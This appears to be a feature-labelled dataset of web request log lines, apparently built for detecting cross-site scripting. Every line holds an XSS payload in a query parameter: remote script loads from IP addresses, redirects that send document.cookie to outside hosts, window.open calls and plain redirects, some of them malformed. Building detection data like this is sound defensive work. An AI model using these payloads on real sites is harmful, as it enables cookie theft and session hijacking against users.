+84,1,200,1210,7,31,17,6,2,GET /?file=<script><script+src="http://190.190.233.135/123303.js=></script> HTTP/1.1
+102,1,200,4202,7,56,19,6,2,GET /?search=<script>window.location='http://101.86.131.89/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,7161,8,30,16,6,2,GET /?file=<script>%window.open('http://201.37.52.103/877354')3C/script> HTTP/1.1
+103,1,200,5466,7,56,19,6,2,GET /?search=<script>window.location='http://191.151.212.41/?cookie='+document.cookie</script> HTTP/1.1
+79,1,200,7644,7,35,14,5,2,GET /?p=<script>window.location.href="http://168.255.151.202"</script> HTTP/1.1
+99,1,200,1899,7,54,19,6,2,GET /?name=<script>window.location='http://5.15.189.223/?cookie='+document.cookie</script> HTTP/1.1
+83,1,200,5185,7,40,14,5,2,GET /?search=<script>window.location.href="http://115.191.198.92"</script> HTTP/1.1
+80,1,200,2725,7,28,17,6,2,GET /?p=<script><script+src="http://56.157.130.181/802769.js=></script> HTTP/1.1
+77,1,200,1958,8,27,16,6,2,GET /?p=<script>%window.open('http://84.59.20.240/813757')3C/script> HTTP/1.1
+82,1,200,7160,7,31,17,6,2,GET /?name=<script><script+src="http://38.255.197.60/104257.js=></script> HTTP/1.1
+100,1,200,3969,7,54,19,6,2,GET /?file=<script>window.location='http://129.144.118.2/?cookie='+document.cookie</script> HTTP/1.1
+103,1,200,1562,7,56,19,6,2,GET /?search=<script>window.location='http://11.149.169.109/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,5019,7,40,14,5,2,GET /?search=<script>window.location.href="http://52.8.202.141"</script> HTTP/1.1
+101,1,200,4723,7,54,19,6,2,GET /?file=<script>window.location='http://45.164.171.113/?cookie='+document.cookie</script> HTTP/1.1
+84,1,200,2550,7,33,17,6,2,GET /?search=<script><script+src="http://247.206.232.54/39536.js=></script> HTTP/1.1
+78,1,200,7884,7,35,14,5,2,GET /?p=<script>window.location.href="http://28.157.114.239"</script> HTTP/1.1
+83,1,200,1327,7,33,17,6,2,GET /?search=<script><script+src="http://90.181.65.190/56754.js=></script> HTTP/1.1
+100,1,200,4623,7,54,19,6,2,GET /?file=<script>window.location='http://229.70.26.143/?cookie='+document.cookie</script> HTTP/1.1
+83,1,200,4540,7,33,17,6,2,GET /?search=<script><script+src="http://89.20.76.227/376852.js=></script> HTTP/1.1
+77,1,200,4079,7,28,17,6,2,GET /?p=<script><script+src="http://65.44.36.167/45645.js=></script> HTTP/1.1
+102,1,200,1476,7,56,19,6,2,GET /?search=<script>window.location='http://131.136.78.92/?cookie='+document.cookie</script> HTTP/1.1
+78,1,200,7495,7,28,17,6,2,GET /?p=<script><script+src="http://212.33.3.134/957539.js=></script> HTTP/1.1
+79,1,200,4982,7,38,14,5,2,GET /?name=<script>window.location.href="http://250.13.120.9"</script> HTTP/1.1
+82,1,200,1570,8,32,16,6,2,GET /?search=<script>%window.open('http://63.115.254.9/265590')3C/script> HTTP/1.1
+82,1,200,2919,7,31,17,6,2,GET /?file=<script><script+src="http://189.95.210.31/413274.js=></script> HTTP/1.1
+103,1,200,2146,7,56,19,6,2,GET /?search=<script>window.location='http://153.18.106.180/?cookie='+document.cookie</script> HTTP/1.1
+82,1,200,4965,7,40,14,5,2,GET /?search=<script>window.location.href="http://51.141.147.34"</script> HTTP/1.1
+83,1,200,4166,8,32,16,6,2,GET /?search=<script>%window.open('http://73.182.101.16/253076')3C/script> HTTP/1.1
+81,1,200,6920,7,38,14,5,2,GET /?name=<script>window.location.href="http://197.66.225.121"</script> HTTP/1.1
+79,1,200,1307,7,28,17,6,2,GET /?p=<script><script+src="http://46.76.175.187/679439.js=></script> HTTP/1.1
+101,1,200,2227,7,56,19,6,2,GET /?search=<script>window.location='http://72.0.117.234/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,3551,7,38,14,5,2,GET /?file=<script>window.location.href="http://119.78.168.165"</script> HTTP/1.1
+82,1,200,1331,8,32,16,6,2,GET /?search=<script>%window.open('http://49.70.54.150/660027')3C/script> HTTP/1.1
+80,1,200,2644,7,28,17,6,2,GET /?p=<script><script+src="http://189.235.43.111/467967.js=></script> HTTP/1.1
+98,1,200,1472,7,54,19,6,2,GET /?name=<script>window.location='http://25.153.64.1/?cookie='+document.cookie</script> HTTP/1.1
+84,1,200,5382,7,31,17,6,2,GET /?name=<script><script+src="http://185.112.169.100/935893.js=></script> HTTP/1.1
+83,1,200,7895,7,33,17,6,2,GET /?search=<script><script+src="http://153.51.66.13/153578.js=></script> HTTP/1.1
+98,1,200,5644,7,54,19,6,2,GET /?name=<script>window.location='http://19.7.238.62/?cookie='+document.cookie</script> HTTP/1.1
+101,1,200,7929,7,54,19,6,2,GET /?name=<script>window.location='http://108.10.130.234/?cookie='+document.cookie</script> HTTP/1.1
+82,1,200,6428,8,30,16,6,2,GET /?name=<script>%window.open('http://116.150.213.73/810454')3C/script> HTTP/1.1
+83,1,200,2005,8,30,16,6,2,GET /?name=<script>%window.open('http://129.211.200.148/179234')3C/script> HTTP/1.1
+83,1,200,1263,8,30,16,6,2,GET /?name=<script>%window.open('http://197.209.150.169/486916')3C/script> HTTP/1.1
+101,1,200,1358,7,56,19,6,2,GET /?search=<script>window.location='http://12.219.6.114/?cookie='+document.cookie</script> HTTP/1.1
+100,1,200,2749,7,54,19,6,2,GET /?name=<script>window.location='http://84.116.84.204/?cookie='+document.cookie</script> HTTP/1.1
+81,1,200,5358,7,28,17,6,2,GET /?p=<script><script+src="http://111.173.134.109/256952.js=></script> HTTP/1.1
+83,1,200,3961,8,30,16,6,2,GET /?file=<script>%window.open('http://219.253.198.171/638571')3C/script> HTTP/1.1
+83,1,200,7930,7,40,14,5,2,GET /?search=<script>window.location.href="http://155.251.79.198"</script> HTTP/1.1
+84,1,200,1947,7,31,17,6,2,GET /?name=<script><script+src="http://251.247.151.109/288323.js=></script> HTTP/1.1
+82,1,200,1872,8,30,16,6,2,GET /?name=<script>%window.open('http://169.85.122.185/751461')3C/script> HTTP/1.1
+81,1,200,1381,7,33,17,6,2,GET /?search=<script><script+src="http://44.9.12.49/114032.js=></script> HTTP/1.1
+81,1,200,2115,8,30,16,6,2,GET /?file=<script>%window.open('http://149.222.27.50/264688')3C/script> HTTP/1.1
+84,1,200,2324,7,40,14,5,2,GET /?search=<script>window.location.href="http://194.130.146.211"</script> HTTP/1.1
+78,1,200,1954,8,27,16,6,2,GET /?p=<script>%window.open('http://248.228.231.2/940781')3C/script> HTTP/1.1
